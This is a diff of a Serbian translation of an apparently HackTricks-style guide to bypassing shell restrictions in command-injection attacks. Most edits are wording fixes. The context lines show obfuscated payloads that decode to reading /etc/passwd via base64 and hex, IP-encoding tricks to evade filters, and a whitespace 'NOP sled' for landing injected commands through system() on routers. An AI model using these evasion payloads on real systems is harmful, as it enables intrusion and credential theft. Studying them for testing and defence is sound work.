@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Uobičajeni Obilazi Ograničenja
+## Uobičajeni zaobilaženja ograničenja
 
 ### Reverse Shell
 ```bash
@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Zaobilaženje sa heksadecimalnim kodiranjem
+### Bypass sa hex kodiranjem
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -124,7 +124,7 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Bypass IPs
+### Zaobilaženje IP-ova
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -312,7 +312,7 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Kada ranjivost omogućava delimičnu kontrolu nad argumentom koji na kraju dolazi do `system()` ili drugog shella, možda nećete znati tačan pomak na kojem izvršavanje počinje da čita vaš payload. Tradicionalni NOP sledovi (npr. `\x90`) **ne** rade u sintaksi shella, ali Bash će bezopasno ignorisati vodeći razmak pre izvršavanja komande.
+Kada ranjivost omogućava da delimično kontrolišete argument koji na kraju dolazi do `system()` ili drugog shella, možda ne znate tačan pomak na kojem izvršavanje počinje da čita vaš payload. Tradicionalni NOP sledovi (npr. `\x90`) **ne** rade u sintaksi shella, ali Bash će bezopasno ignorisati vodeći razmak pre izvršavanja komande.
 
 Stoga možete kreirati *NOP sled za Bash* tako što ćete prefiksirati svoju pravu komandu dugim nizom razmaka ili tab karaktera:
 ```bash
@@ -324,18 +324,18 @@ Ako ROP lanac (ili bilo koja primitivna tehnika korupcije memorije) dovede pokaz
 
 Praktične upotrebe:
 
-1. **Konfiguracione blob-ove mapirane u memoriji** (npr. NVRAM) koji su dostupni između procesa.
+1. **Konfiguracione blobove mapirane u memoriji** (npr. NVRAM) koji su dostupni između procesa.
 2. Situacije u kojima napadač ne može da upisuje NULL bajtove da bi poravnao payload.
 3. Ugrađeni uređaji gde je dostupan samo BusyBox `ash`/`sh` – oni takođe ignorišu vodeće razmake.
 
 > 🛠️  Kombinujte ovu trik sa ROP gadgetima koji pozivaju `system()` da dramatično povećate pouzdanost eksploatacije na IoT ruterima sa ograničenom memorijom.
 
-## Reference & Više
+## Reference i više
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
